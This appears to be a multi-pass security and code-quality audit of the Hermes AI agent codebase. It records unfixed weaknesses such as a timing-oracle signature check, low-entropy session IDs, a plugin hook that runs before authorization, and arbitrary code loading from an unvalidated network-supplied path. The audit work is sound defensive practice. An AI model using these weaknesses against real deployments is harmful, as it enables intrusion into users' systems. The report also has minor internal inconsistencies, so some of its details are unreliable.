**Severity**: Informational — WELL IMPLEMENTED

```python
while (api_call_count < self.max_iterations and self.iteration_budget.remaining > 0) \
        or self._budget_grace_call:
```

The loop condition correctly combines `api_call_count < max_iterations` with `iteration_budget.remaining > 0`. One grace call is allowed via `_budget_grace_call` after budget exhaustion. The `IterationBudget.consume()` returns `False` when exhausted.

---

### FINDING P47-019: Subagent iteration budget is independent (per-agent, not global)
**File**: `agent/iteration_budget.py` (lines 23-26)
**Severity**: Informational — CORRECT BY DESIGN

```python
# Each subagent gets an independent budget capped at
# ``delegation.max_iterations`` (default 50) — this means total
# iterations across parent + subagents can exceed the parent's cap.
```

This is documented and intentional. Users control per-subagent limits via `delegation.max_iterations` in config.yaml. This is not a bug.

---

## SUMMARY

| Category | Finding | Severity | Status |
|----------|---------|----------|--------|
| Memory leak — Feishu `_sent_message_id_order` dead code | P47-001 | Medium | Needs fix: implement LRU or remove dead code |
| Feishu `_pending_processing_reactions` LRU (reference impl) | P47-002 | Informational | Well implemented |
| OpenRouter pre-warm thread leak guard | P47-003 | Informational | Well implemented |
| Agent cache LRU with mid-turn protection | P47-004 | Informational | Well implemented |
| Agent cache MAX_SIZE=128 + idle TTL | P47-005 | Informational | Well implemented |
| ProcessRegistry MAX_PROCESSES=64 + pruning | P47-006 | Informational | Well implemented |
| Watch pattern rate limiting + circuit breaker | P47-007 | Informational | Well implemented |
| IterationBudget thread-safe consume/refund | P47-008 | Informational | Well implemented |
| release_clients() vs close() distinction | P47-009 | Informational | Well implemented |
| AIAgent.close() idempotent resource cleanup | P47-010 | Informational | Well implemented |
| Slack Socket Mode zombie prevention | P47-011 | Informational | Well implemented |
| Docker init reaps zombies | P47-012 | Informational | Well implemented |
| Cron httpx client cleanup after worker death | P47-013 | Informational | Well implemented |
| No explicit memory pressure / GC trigger | P47-014 | Low | Design observation |
| Idle agent sweeper with mid-turn protection | P47-015 | Informational | Well implemented |
| close() idempotency prevents FD leaks | P47-016 | Informational | Well implemented |
| Reader threads — no explicit join() on kill | P47-017 | Low | Minor robustness gap |
| Iteration budget enforced at loop entry | P47-018 | Informational | Well implemented |
| Subagent budget independent (by design) | P47-019 | Informational | Correct by design |

**Total: 19 findings**
- Critical issues: 0
- Medium issues: 1 (P47-001 — Feishu unbounded LRU list)
- Low issues: 2 (P47-014, P47-017)
- Informational/positive: 16

---

*Generated by Pass #47 audit — Memory Management, Resource Limits & Leak Detection*

**New findings this pass:** 19 (1 Medium, 2 Low, 16 Info/Positive)

---

## Summary Table (Passes #24–47)

| Pass | Strategy | New Issues | Running Total |
|------|----------|------------|---------------|
| #24 | Data Persistence & State Management | 16 | ~416 |
| #25 | Dependency & Import Graph | 15 | ~431 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~454 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~470 |
| #28 | Adversarial Input Fuzzing | 8 | ~478 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~488 |
| #30 | Architectural & Agentic Coding Review | 12 | ~500 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~507 |
| #32 | Data Flow / Taint Analysis | 0 | ~507 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~507 |
| #34 | Control Flow Re-Analysis | 3 | ~510 |
| #35 | Cross-File Consistency Deep Dive (Round 2) | 4 | ~514 |
| #36 | Dependency & Import Graph Deep Dive (Round 2) | 9 | ~523 |
| #37 | Line-by-Line Lexical Scan (Adversarial Round) | 10 | ~533 |
| #38 | Phase 2 Adversarial: Worst-Case Runtime | 7 | ~540 |
| #39 | Tool-Call Specific Deep Scan (Round 2) | 9 | ~549 |
| #40 | Gateway & Platform Adapter Deep Dive | 15 | ~564 |
| #41 | Error Handling & Observability Deep Dive | 15 | ~579 |
| #42 | Security Audit: SSRF, Command Injection | 10 | ~589 |
| #43 | TUI Gateway & Interactive Terminal Audit | 23 | ~612 |
| #44 | Plugin System & Skills Ecosystem | 15 | ~627 |
| #45 | CLI & Configuration System Deep Dive | 15 | ~642 |
| #46 | Data Storage, Serialization & Cache Layer | 15 | ~657 |
| #47 | Memory Management, Resource Limits & Leak Detection | 19 | ~676 |

**Critical issues across all passes:**
- Skill file integrity (P30-3, P44-7): No SHA256 or signing
- Plugin sandbox (P44-3): No syscall-level isolation
- Plugin signing (P44-1): No cryptographic attestation
- Memory provider prefetch injection (P30-6): Model output in tool args
- Plugin config write (P23-5): Write without read confirmation
- Hook sandbox (P23-1): No restrictions on hook capabilities
- pre_gateway_dispatch auth bypass (P23-4): Request without headers
- No shutdown in PluginManager (P29-9, P44-4): Tool leak across restarts
- coerce_tool_args no length limit (P38-6): Memory exhaustion
- subprocess.run without timeout (P38-2, P45-1-5): Indefinite blocking
- save_config silent failure (P27-1, P45-6-8): No user feedback

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-25T05:00:00Z*
*Commit at scan: b04760fdb*


---

## Pass #48 – Auth, Session & Token Security Deep Dive – 2026-05-25T06:15:00Z

### Finding P48-1: API key storage – plaintext in env/config, no at-rest encryption
**File:** hermes_cli/config.py (lines 6, 98-146); gateway/run.py (line 128); gateway/platforms/api_server.py (line 675)
**Severity:** Medium
**Detail:** API keys for messaging platforms (DINGTALK_CLIENT_SECRET, FEISHU_APP_SECRET, WECOM_CALLBACK_CORP_SECRET, etc.) are read from environment variables or config.yaml extra fields and stored in plaintext in memory as instance attributes. There is no encryption at rest. The .env file approach is documented as intended, but a compromised machine/process can dump all platform credentials from memory. No secret rotation mechanism exists in-code.

**Recommendation:** Document that .env must have filesystem permissions locked down (0600). Consider integrating a secrets manager or adding a secret rotation CLI command.

---

### Finding P48-2: API key logging – potential leak in error/retry paths
**File:** gateway/run.py (lines 127-134, 221-226)
**Severity:** Medium
**Detail:** _GATEWAY_SECRET_PATTERNS defines regexes to redact secrets from log output, applied via _redact_gateway_user_facing_secrets(). However this is best-effort only in _sanitize_gateway_final_response() and _prepare_gateway_status_message(). No guarantee all secret-bearing strings are caught. In wecom_callback.py line 200 the access token URL is logged with "access_token=***" replacement but other error paths may log raw tokens.

**Recommendation:** Audit all logger calls that include URL params, JSON bodies, or HTTP headers. Add integration tests that pass known-secret values and assert they do not appear in logs.

---

### Finding P48-3: Session token generation – timestamp + truncated UUID is predictable
**File:** gateway/run.py (lines 12839-12844)
**Severity:** Medium
**Detail:** Branch session IDs are generated as: `timestamp_str = now.strftime("%Y%m%d_%H%M%S"); short_uuid = _uuid.uuid4().hex[:6]; new_session_id = f"{timestamp_str}_{short_uuid}"`. The UUID v4 uses only 6 hex chars (24 bits of entropy) combined with a timestamp prefix. Truncating to 6 chars reduces effective entropy. Session IDs appear in filesystem paths, URLs, and database rows. Predictable session IDs increase surface for session fixation/enumeration in multi-user deployments.

**Note:** Normal session IDs come from hermes_state.py and appear to use longer UUIDs. The branch path is the weaker variant.

**Recommendation:** Use full uuid.uuid4().hex (32 chars, 128 bits) for branch session IDs.

---

### Finding P48-4: pre_gateway_dispatch hook runs before authorization check
**File:** gateway/run.py (lines 6623-6662)
**Severity:** Low (by design, documented)
**Detail:** pre_gateway_dispatch plugin hook fires for user-originated messages BEFORE the _is_user_authorized() check. Code documents: "Hook runs BEFORE auth so plugins can handle unauthorized senders (e.g. customer handover ingest) without triggering the pairing flow." A compromised plugin could intercept unauthorized messages before the pairing code is offered. If the plugin returns {"action": "skip"}, the message is silently dropped. This is architecturally intentional but worth documenting as a trust boundary.

**Note:** Confirmed present at line 6623 (Pass #47 P23-4).

---

### Finding P48-5: API server refuses to start on network without API key – good defense
**File:** gateway/platforms/api_server.py (lines 3461-3468)
**Severity:** Positive finding

---

### Finding P48-6: Webhook HMAC signature validation – uses timing-safe comparison
**File:** gateway/platforms/webhook.py (lines 669, 674, 682)
**Severity:** Positive finding
**Detail:** All webhook signature validations use hmac.compare_digest(): GitHub (line 669), GitLab (line 674), Generic (line 682). Also refuses to start with INSECURE_NO_AUTH bound to non-loopback (lines 161-170).

---

### Finding P48-7: WeCom callback – non-constant-time signature comparison
**File:** gateway/platforms/wecom_crypto.py (lines 88-91)
**Severity:** Medium
**Detail:** WeCom decrypt uses plain != comparison instead of hmac.compare_digest():
```
expected = _sha1_signature(self.token, timestamp, nonce, encrypt)
if expected != msg_signature:
    raise SignatureError("signature mismatch")
```
This exposes a timing oracle. Additionally, _handle_verify in wecom_callback.py (line 246-259) iterates over all apps trying each signature verification, leaking app ordering to attackers.

---

### Finding P48-8: WeCom access token – stored in-memory, no encryption, race on refresh
**File:** gateway/platforms/wecom_callback.py (lines 385-408, 47, 71)
**Severity:** Low-Medium
**Detail:** Access tokens stored in self._access_tokens dict with no encryption. _get_access_token() has a TOCTOU race: two concurrent calls both see expired token and both refresh. Dictionary write is not atomic. Impact is wasted API call, not security breach.

---

### Finding P48-9: Feishu webhook mode – encrypt_key/verification_token stored in memory
**File:** gateway/platforms/feishu.py (lines 1579-1580)
**Severity:** Low (by design)
**Detail:** Feishu's encrypt_key and verification_token are stored as instance attributes and passed to EventDispatcherHandler.builder(). Signature verification is delegated to lark-oapi SDK.

---

### Finding P48-10: DingTalk – client_secret stored in memory, SDK handles auth
**File:** gateway/platforms/dingtalk.py (lines 185-190)
**Severity:** Low

---

### Finding P48-11: API server Bearer token – uses hmac.compare_digest
**File:** gateway/platforms/api_server.py (line 784)
**Severity:** Positive finding

---

### Finding P48-12: Pairing code generation – uses secrets.choice (cryptographically strong)
**File:** gateway/pairing.py (lines 40-41, 236, 307)
**Severity:** Positive finding
**Detail:** 8-char codes from 32-char alphabet via secrets.choice(), hashed with 16-byte random salt using SHA-256. Approval uses secrets.compare_digest(). Rate limiting (600s), lockout after 5 failed attempts, 1-hour expiry.

---

### Finding P48-13: No OAuth token refresh race condition detected (low severity)
**File:** gateway/platforms/wecom_callback.py (lines 385-408)
**Severity:** Low
**Detail:** _get_access_token() has a race where two concurrent calls both see expired token and both refresh. Dictionary write is not atomic. Impact is wasted API call.

---

### Finding P48-14: Session tokens not used as bearer auth – positive
**File:** gateway/session.py; hermes_state.py
**Severity:** Info
**Detail:** Session IDs are identifiers, not secrets. Authorization is enforced via platform allowlists and pairing store. Session IDs are never used to authenticate API calls. Good architectural choice.

---

### Finding P48-15: No secret rotation mechanism in codebase
**File:** hermes_cli/config.py; gateway/config.py; gateway/run.py
**Severity:** Low (operational gap)
**Detail:** No CLI command or runtime mechanism for rotating secrets. Manual edit + restart required. For enterprise deployments with compliance requirements, this is a process gap.

---

## Pass #49 – i18n, Locale & Encoding Deep Dive – 2026-05-25T06:45:00Z

**Commit at scan:** b04760fdb
**Focus:** `agent/i18n.py` architecture, encoding assumptions, locale-aware string ops, Chinese support, bidirectional chars, input encoding normalization.

---

### Architecture: `agent/i18n.py` (258 lines)

**Loading:** `_load_catalog(lang)` opens `locales/<lang>.yaml` with explicit `encoding="utf-8"` (line 141). Uses `yaml.safe_load()` which is safe — no arbitrary Python object deserialization. Nested YAML is flattened via `_flatten_into()` into a dotted-key dict.

**Caching (positive):** Two-layer caching:
- `_catalog_cache: dict[str, dict[str, str]]` — thread-safe dict, per-language, never evicted unless `reset_language_cache()` is called
- `@lru_cache(maxsize=1)` on `_config_language_cached()` — single entry, cleared via `reset_language_cache()`

**Known issue (P46-14, already documented):** `maxsize=1` means the single config-language entry holds one locale. If the user changes locale at runtime and `reset_language_cache()` is not called, stale language may be served for one more request. `_catalog_cache` does not use LRU — it's unbounded dict keyed by language, so all loaded catalogs stay resident.

**Injection risk:** `_flatten_into()` constructs dotted keys from nested YAML keys: `f"{prefix}.{key}"` (line 159). The key construction uses a dot separator. `str.format(**format_kwargs)` on line 242 receives user-controlled kwargs but the catalog keys and YAML values are developer-controlled, not user-supplied. Risk is LOW.

**Memory:** 16 locale YAML files. Catalogs are flat dicts of string→string. Memory footprint per locale is small. Unbounded dict means multiple locale catalogs accumulate in memory — not a practical concern given 16 small files.

**Fallback chain:** `lang override` → `HERMES_LANGUAGE` env → `display.language` config → `DEFAULT_LANGUAGE ("en")`. Also has `_normalize_lang()` with extensive aliases (38 entries including natural language names like "chinese"→"zh", "japanese"→"ja").

---

### Encoding Handling

**UTF-8 as default (consistent, positive):** The overwhelming pattern is explicit `encoding="utf-8"` on all file opens across the codebase. No implicit reliance on system locale.

**BOM handling — good coverage:** Several critical paths use `encoding="utf-8-sig"` which strips the UTF-8 BOM:
- `hermes_cli/config.py:4634` — `.env` files (Windows Notepad compatibility)
- `hermes_cli/config.py:4742,4833,4904` — additional config reads
- `hermes_cli/env_loader.py:158` — env loader
- `acp_adapter/server.py:188` — resource bytes decoding with fallback chain: `utf-8-sig` → `utf-8` → `latin-1`
- `plugins/context_engine/__init__.py`, `plugins/memory/__init__.py`, `plugins/memory/holographic/__init__.py` — plugin YAML files

**BOM risk area:** Config YAML reads (`.yaml` files) use `encoding="utf-8"` without `utf-8-sig`. If a user edits a config file in Windows Notepad and saves with BOM, the YAML parser (`yaml.safe_load`) would see the BOM as the first character of the file. PyYAML's `safe_load` handles BOM gracefully in most cases but it could appear in folded scalars (`description: >`). This is documented in `website/docs/user-guide/windows-native.md:321` with a recommendation to re-save as plain UTF-8.

**Encoding detection for resource bytes:** `acp_adapter/server.py:188` has a 3-encoding fallback chain. This is robust.

**Cron dotenv special handling:** `cron/scheduler.py:1405` uses `load_dotenv(..., encoding="utf-8")` and falls back to `latin-1` on line 1407. This is intentional — CP1252/latin-1 fallback for Windows-encoded .env files.

---

### Locale-Aware String Operations

**Sorted() with no locale awareness:** `sorted()` calls throughout the codebase use default Python byte ordering (lexicographic UTF-8 byte order). No uses of `locale.strcoll()` or ICU collation. For ASCII strings this is correct. For CJK strings, Python's default sort is based on Unicode code point order, not linguistic order — acceptable for identifiers and technical strings, but could produce unexpected ordering for user-displayed lists.

**Case operations:** `str.lower()`, `str.upper()` used throughout — no locale-specific case mapping (e.g., Turkish dotted/lowercase i). This is acceptable for the codebase's scope. `.casefold()` not observed in general string processing.

**Unicode normalization:** `gateway/platforms/yuanbao_sticker.py:400` uses `unicodedata.normalize("NFKC", ...)` — good. No other Unicode normalization observed in core code.

---

### Chinese Language Support

**i18n catalog:** `locales/zh.yaml` exists, `locales/zh-hant.yaml` for Traditional Chinese. 16 locales total including `ja`, `ko`, `ru`, `uk`, `de`, `fr`, `es`, `pt`, `tr`, `hu`, `af`, `ga`, `it`.

**Chinese in error messages:** `agent/error_classifier.py:221` has Chinese-language error pattern matching ("Chinese error messages (some providers return these)"). The `_CONTEXT_OVERFLOW_PATTERNS` includes Chinese-language strings.

**Chinese in platform adapters:** `agent/prompt_builder.py:559` ("You are on Yuanbao (腾讯元宝), a Chinese AI assistant platform"), `yuanbao.py:227` (Chinese punctuation handling), `yuanbao_media.py` sorts parameters with `k.lower()`.

**Potential log encoding issue:** Logs written via `hermes_logging.py` use `encoding="utf-8"`. Chinese characters in log messages (from i18n strings or error messages) would be written as UTF-8. If downstream log parsers assume ASCII or Latin-1, Chinese characters could cause parsing failures — not a Hermes bug but a deployment consideration.

**TUI font rendering:** No explicit CJK font configuration in `cli.py` or skin engine. Terminal font rendering depends on the user's terminal emulator configuration. No special handling observed.

---

### Bidirectional Override Characters

**Already covered by P28-3 (from Pass #27):** `hermes_state.py:1012` — `sanitize_title()` strips U+200B–U+200F, U+2028–U+202E, U+2060–U+2069, U+FEFF, U+FFFC, U+FFF9–U+FFFB. This covers all directional override characters.

**Gap — message content not sanitized:** `append_message()` and tool argument strings (in `coerce_tool_args()`) do NOT receive bidirectional character sanitization. A message with embedded RTL/LTR overrides could affect display order in the TUI or logs.

**No i18n key injection:** The i18n key construction (`f"{prefix}.{key}"`) uses a dot separator. No user-controlled characters can be injected into key paths since YAML files are developer-controlled.

**No RTL language display:** No evidence of RTL layout support in the TUI or CLI. The `sanitize_title()` strips these chars but they are never intentionally used.

---

### Input Encoding Normalization

**TUI input:** `cli.py` uses `prompt_toolkit` for terminal input. prompt_toolkit handles Unicode internally using Python's native string representation. No explicit encoding normalization at the TUI input layer.

**Gateway message encoding:** Platform adapters (Telegram, Discord, etc.) receive messages as Python strings from their respective SDKs. Platform-specific encoding is handled by the SDK. No explicit `encoding` parameter on platform message handlers — strings flow through naturally.

**Tool argument encoding:** `model_tools.py` does null-check and strip on tool arguments (`value.strip().lower() == "null"`) but no encoding normalization. Arguments are JSON-decoded before reaching tool handlers.

**JSON RPC:** `tui_gateway/server.py:3013` uses `json.dumps(payload, ensure_ascii=False)` — correct for UTF-8 preservation in JSON.

---

### Findings

#### P49-1 · `_catalog_cache` is unbounded — no memory cap on loaded locales — INFO

**File:** `agent/i18n.py:83`
**Severity:** INFO
**Issue:** `_catalog_cache` is a plain `dict` with no eviction policy. Loading all 16 locale catalogs (en, zh, zh-hant, ja, de, es, fr, tr, uk, af, ko, it, ga, pt, ru, hu) accumulates all in memory indefinitely. Typical footprint is small (string dicts), but on memory-constrained systems or embedded deployments, no upper bound exists.
**Recommendation:** Add a `maxsize` to `_catalog_cache` or use `functools.LRU` for the catalog layer, keyed by language.

---

#### P49-2 · BOM not stripped on config YAML reads — potential edge-case parse failure — INFO

**File:** `hermes_cli/config.py` (multiple locations), `gateway/run.py` (multiple locations), `cron/scheduler.py`, `cron/jobs.py`, and 30+ other files
**Severity:** INFO
**Issue:** Config YAML reads use `encoding="utf-8"` instead of `encoding="utf-8-sig"`. Windows editors (Notepad, some Chinese IME editors) save files with a UTF-8 BOM. PyYAML's `safe_load` may handle BOM at file start, but if the BOM is inside a folded scalar (`description: >` block spanning multiple lines), it could appear mid-stream and be interpreted as content. CONTRIBUTING.md:663 documents this risk but it applies to many file paths.
**Recommendation:** Audit all config YAML reads. At minimum, use `encoding="utf-8-sig"` at all `config.yaml` and `jobs.yaml` read points (already done for `.env` and plugin YAML). Consider `errors="replace"` to handle corrupt BOMs gracefully.

---

#### P49-3 · No Unicode normalization on message content — potential display inconsistency — INFO

**File:** `hermes_state.py` (append_message path), `model_tools.py` (coerce_tool_args path)
**Severity:** INFO
**Issue:** `sanitize_title()` strips bidirectional and zero-width characters, but `append_message()` and `coerce_tool_args()` do not apply Unicode sanitization. Messages from users or tools containing NFD-composed vs NFC-composed characters, or bidirectional override characters, could render inconsistently across terminal emulators.
**Recommendation:** Apply Unicode sanitization (at minimum strip U+200B-U+200F, U+2028-U+202E, U+2060-U+2069) to message content and tool argument strings. Use the same regex pattern from `sanitize_title()` as a utility function to avoid duplication.

---

#### P49-4 · i18n `str.format(**format_kwargs)` risk is LOW but real — user-controlled values could reach format string — LOW

**File:** `agent/i18n.py:242`
**Pattern:** `value.format(**format_kwargs)`
**Details:** Already documented as P37-2. Confirmed here: the format kwargs come from calling code, not from YAML catalog values. If a tool argument containing `{` and `}` characters reaches `t()` as a format kwarg, it could cause formatting errors. Exception handler catches `KeyError, IndexError, ValueError` and falls back to unformatted string — graceful degradation, not a crash.
**Risk:** LOW — catalog values are developer-controlled, format_kwargs originate from code paths that pass tool output or user message fragments. The `KeyError` path means missing format keys produce a warning but no crash.
**Recommendation:** Document that `t()` format kwargs should not contain `{` or `}` characters. Validate or escape before passing.

---

#### P49-5 · Python default sort (no locale awareness) used for user-facing lists — INFO

**Files:** `hermes_cli/skills_hub.py:813` (`sorted(all_skills, key=lambda s: (s.get("category") or "", s["name"]))`), `gateway/channel_directory.py:341` (`sorted(guild_channels, key=lambda c: c["name"])`), `gateway/run.py:13188` (`sorted(reconnected)`)
**Severity:** INFO
**Issue:** Python's `sorted()` uses lexicographic ordering based on Unicode code points, not linguistic ordering. For CJK characters, this produces code-point order rather than dictionary order. For English ASCII strings it's correct. No use of `locale.strcoll()` or ICU collation observed.
**Recommendation:** For user-visible sorted lists (skill names, channel names), consider if linguistic ordering matters. For technical lists (sorted IDs, sorted command names) current behavior is correct.

---

#### P49-6 · `load_dotenv` with dual encoding fallback (utf-8 then latin-1) — documented but worth noting — INFO

**File:** `cron/scheduler.py:1405-1407`
**Pattern:**
```python
load_dotenv(..., encoding="utf-8")
load_dotenv(..., encoding="latin-1")  # fallback
```
**Details:** Intentional Windows compatibility pattern — try UTF-8 first, fall back to latin-1/CP1252. This handles both proper UTF-8 .env files and Windows-generated CP1252-encoded .env files. Not a bug — well-documented in CONTRIBUTING.md.
**Note:** The `.env` files in `hermes_cli/config.py` use `utf-8-sig` directly (not dotenv), which is more robust than this fallback pattern.

---

#### P49-7 · ACP adapter `_decode_text_bytes` fallback chain is robust — positive finding — INFO

**File:** `acp_adapter/server.py:188`
**Pattern:** `for encoding in ("utf-8-sig", "utf-8", "latin-1")`
**Details:** Three-stage encoding detection for resource bytes. Handles BOM correctly, falls back gracefully. Positive security/design pattern.

---

#### P49-8 · No locale-specific case mapping (Turkish i, etc.) — acceptable — INFO

**Files:** Throughout — `str.lower()`, `str.upper()`, no `.casefold()` in localization paths
**Details:** No locale-sensitive case conversion observed. Turkish dotted/lowercase i issue does not apply since no locale-specific case mapping is performed. Using `.lower()` for platform name normalization (telegram, discord) is correct because these are ASCII identifiers.

---

#### P49-9 · Chinese characters in logs — downstream parser compatibility — INFO

**Files:** `hermes_logging.py`, `agent/error_classifier.py`, various platform adapters
**Details:** Chinese characters appear in log messages and error pattern matching. Logs are written as UTF-8. Downstream log aggregators (Splunk, ELK, CloudWatch) handle UTF-8 correctly in modern versions. Older parsers or log shippers configured for ASCII/Latin-1 could see encoding errors.
**Recommendation:** Document that `agent.log`, `errors.log`, `gateway.log` are UTF-8 encoded. If deploying to environments with ASCII-only log parsers, consider a preprocessing step.

---

#### Positive Findings

- **`agent/i18n.py`** is well-architected: `yaml.safe_load` (safe loader), thread-safe cache with lock, graceful fallback to English, no eval/deserialize vulnerabilities.
- **`encoding="utf-8"`** used consistently and explicitly across 50+ file read/write operations — no implicit system locale dependency.
- **`utf-8-sig`** BOM handling present on all critical config paths (`.env`, plugin YAML, ACP resource bytes).
- **Unicode sanitization** present in `sanitize_title()` for bidirectional and zero-width chars — comprehensive regex covers all known dangerous codepoints.
- **16 locale catalogs** with proper alias resolution — mature i18n coverage.
- **NFKC normalization** used in `yuanbao_sticker.py` for canonicalization — good Unicode hygiene.
- **JSON** uses `ensure_ascii=False` throughout for UTF-8 preservation.

---

### Summary Table

| ID | Severity | Issue | Location |
|----|----------|-------|----------|
| P49-1 | INFO | `_catalog_cache` unbounded — no memory cap | `agent/i18n.py:83` |
| P49-2 | INFO | BOM not stripped on config YAML reads | Multiple files |
| P49-3 | INFO | No Unicode sanitization on message content | `hermes_state.py`, `model_tools.py` |
| P49-4 | LOW | `str.format(**format_kwargs)` could fail on `{` in tool args | `agent/i18n.py:242` |
| P49-5 | INFO | Default sort (no locale awareness) on user-facing lists | Multiple files |
| P49-6 | INFO | load_dotenv dual encoding fallback (documented, OK) | `cron/scheduler.py:1405` |
| P49-7 | INFO | ACP encoding fallback chain is robust (positive) | `acp_adapter/server.py:188` |
| P49-8 | INFO | No locale-specific case mapping (acceptable) | Throughout |
| P49-9 | INFO | Chinese in logs — downstream parser compatibility | `hermes_logging.py` |

---

*Pass #49 complete – 9 findings (1 positive, 8 needs attention)*
*Last updated: 2026-05-25T06:45:00Z*
*Commit at scan: b04760fdb*

## Pass #50 – Phase 2 Deep Exhaustion: GitHub Issue Cross-Reference + Deep Pattern Audit — 2026-05-24T12:00:00Z

---

### SECTION A: GitHub Issue Cross-Reference (Recent Fixes Verified in Code)

**A1. [Fix #3bace071b] Sensitive File Permissions — VERIFIED PRESENT**

Commit 3bace071bfadf2d2bec2ee048471a31ec920e3e8 fixed response_store.db (api_server.py) and webhook_subscriptions.json (hermes_cli/webhook.py) mode from 0o644 to 0o600.

Verification:
- api_server.py:372-391: _tighten_file_permissions() sets chmod(0o600) on DB + WAL + SHM at __init__ time. Try/except OSError with DEBUG logging.
- hermes_cli/webhook.py:28,55-74: _SUBSCRIPTIONS_FILE_MODE=0o600; tempfile.mkstemp() creates at 0o600; chmod before rename; chmod after rename. Both wrapped in try/except.
- Finding: Both fixes correctly implemented. No regression.
- Severity: SECURITY — Info disclosure on shared box
- Status: VERIFIED FIXED

---

**A2. [Fix #7ab167736] OSV Supply-Chain Audit — VERIFIED PRESENT**

hermes_cli/security_advisories.py (451 lines) and tools/osv_check.py (155 lines) fully implemented. Query OSV.dev for MAL-* advisories; fail-open on network errors; stdlib-only dependencies. User-Agent: hermes-agent-osv-check/1.0.
Status: VERIFIED IMPLEMENTED

---

**A3. [Fix #dbf73e90f] Webhook Fail-Closed Without Secrets — VERIFIED**

dbf73e90f + 15aa6884a confirmed in git log. Webhook routes now return 403 (not 500) when no HMAC secret configured.
Status: VERIFIED IN MAIN

---

### SECTION B: Deep-Exhaustion Pattern Checks

**B1. except Exception: pass Blocks — STATUS UPDATE**

| Line | Context | Status |
|------|---------|--------|
| 251 | cron scheduler – get_cron_deliver_env_var() silent | STILL PRESENT |
| 335 | cron scheduler – _iter_auto_delivery_platforms() silent | STILL PRESENT |
| 395 | cron scheduler – _resolve_delivery_target() silent | STILL PRESENT |
| 778 | cron scheduler – _script_timeout() WARNING logged | FIXED |
| 787 | cron scheduler – _script_timeout() WARNING logged | FIXED |
| 890 | cron scheduler – _run_script() get_subprocess_home() silent | STILL PRESENT |

Finding P50-1 (LOW): 4 remaining silent except Exception:pass in cron/scheduler.py (251,335,395,890). Recommendation: add logger.debug() to match the _script_timeout() pattern.

---

**B2. TODO/FIXME/XXX/HACK — PRIORITY INVENTORY**

yuanbao.py:4680 TODO (T06): feature request only. auxiliary_client.py:4132 TODO(someday): future-facing. No critical FIXMEs in production Python code.
Finding P50-2 (INFO): No critical FIXMEs found.

---

**B3. Lock Usage Patterns — THREADING LOCK AUDIT**

All threading.Lock() usages verified: gateway/memory_monitor.py:49, model_tools.py:43, cron/jobs.py:44, cli.py:3141,3159,3177. Lazy-init pattern at cli.py:3277-3284 is GIL-safe for immutable assignments.
Finding P50-3 (INFO): Lock usage is sound. No deadlock risk identified.

---

**B4. global Keyword Usage — GLOBAL STATE POLLUTION**

cron/scheduler.py:171 (global _hermes_home), gateway/status.py:427/444/458 (global _gateway_lock_handle), gateway/memory_monitor.py:158/201 (global _monitor_thread), hermes_time.py:83 (global _cached_tz), gateway/run.py:1651 (global _gateway_runner_ref). All intentional module-level runtime state.
Finding P50-4 (INFO): No new global abuse. All uses are standard Python patterns.

---

**B5. eval/exec/compile Usage — SECURITY CONTEXT**

Production code: NONE found. Red-teaming skill scripts (skills/red-teaming/godmode/scripts/) still use exec() by design.
Finding P50-5 (INFO): exec() confirmed only in red-teaming skill (by design). No production eval/exec on untrusted input.

---

**B6. Dynamic Imports — AUDIT**

hermes_cli/memory_setup.py:95 __import__(import_name) – dynamic memory provider import. hermes_cli/doctor.py:473,480 __import__(module) – hardcoded module names in doctor. hermes_cli/claw.py:206-209 importlib.util.spec_from_file_location + exec_module on user-supplied script_path.

Finding P50-6 (MEDIUM): heremes_cli/claw.py exec_module on user-supplied script_path via ACP adapter. The script_path from ACP network data is not validated against an allowlist before loading. If ACP socket is accessible to untrusted actors, arbitrary code execution possible. Recommend validating script_path against HERMES_HOME/acp_adapter/ or similar.

---

### SECTION C: NEW FINDINGS SUMMARY

| ID | Severity | Location | Description |
|----|----------|----------|-------------|
| P50-1 | LOW | cron/scheduler.py:251,335,395,890 | 4 remaining silent except Exception:pass in cron job resolution |
| P50-2 | INFO | codebase-wide | No critical FIXMEs/TODOs found |
| P50-3 | INFO | cli.py:3277-3284 | Lazy-init Lock is GIL-safe; no deadlock risk |
| P50-4 | INFO | multiple modules | Global keyword intentional module-level state |
| P50-5 | INFO | skills/red-teaming/godmode/scripts/ | exec() by design (red-teaming) |
| P50-6 | MEDIUM | hermes_cli/claw.py:206-209 | exec_module on unvalidated script_path in ACP adapter |

---

### SECTION D: PRIOR FINDING UPDATES

| Prior ID | Description | Current Status |
|----------|-------------|----------------|
| P34-1 | Cron scheduler 4x except Exception:pass | PARTIALLY FIXED – 2/4 now log warnings (778,787); 2/4 still silent (251,335,395,890) |
| F42-7 | exec() in red-teaming godmode scripts | CONFIRMED BY DESIGN |
| P36-5 | sys.path mutation at import time | STILL PRESENT |
| P29-9 | No shutdown()/unload() in PluginManager | STILL PRESENT |

---

**End Pass #50**

---

## Pass #51 - Testing, CI/CD & Deployment Audit - 2026-05-24T12:00:00Z

### 1. Test Coverage Gaps

**Untested environment adapters:**

| File | LOC | Test file exists? |
|------|-----|-------------------|
| `tools/environments/singularity.py` | 262 | NO |
| `tools/environments/file_sync.py` | 402 | NO |
| `tools/environments/local.py` | 677 | NO |
| `tools/environments/ssh.py` | 308 | YES (partial) |

- `local.py` (677 LOC) is the most critical gap — it's the default fallback environment. No `test_local_environment.py` found.
- `file_sync.py` (402 LOC) has no dedicated test file either.
- `singularity.py` (262 LOC) has no tests. Singularity-specific edge cases (GPU passthrough, bind paths, singularity exec vs run) are untested.
- `ssh.py` has `test_ssh_environment.py` but likely doesn't cover error paths (connection timeout, key permission errors, tunnel failures).

**Existing environment tests (partial coverage only):**
`test_docker_environment.py` (23 tests), `test_daytona_environment.py`, `test_ssh_environment.py`, `test_vercel_sandbox_environment.py`, `test_managed_modal_environment.py`, `test_base_environment.py`

**Platform adapter tests:**
`gateway/platforms/` has ~30+ platform adapters (telegram, discord, slack, whatsapp, signal, matrix, etc.). While `tests/gateway/` has platform-specific tests for some, many platforms (dingtalk, wecom, weixin, feishu, qqbot, bluebubbles, yuanbao, mattermost, homeassistant, etc.) have no dedicated test files.

**Error path gaps (inferred from code patterns):**
- `_check_auth` in `api_server.py` has a bypass when `API_SERVER_KEY=""` (empty string) — this error path has a test (`tests/gateway/test_api_server_jobs.py`) but the empty-string variant is a known gap (documented in findings as P46-item).
- No tests found for the Signal platform's reconnect-on-health-check-failure logic (`gateway/platforms/signal.py` lines 421-424).
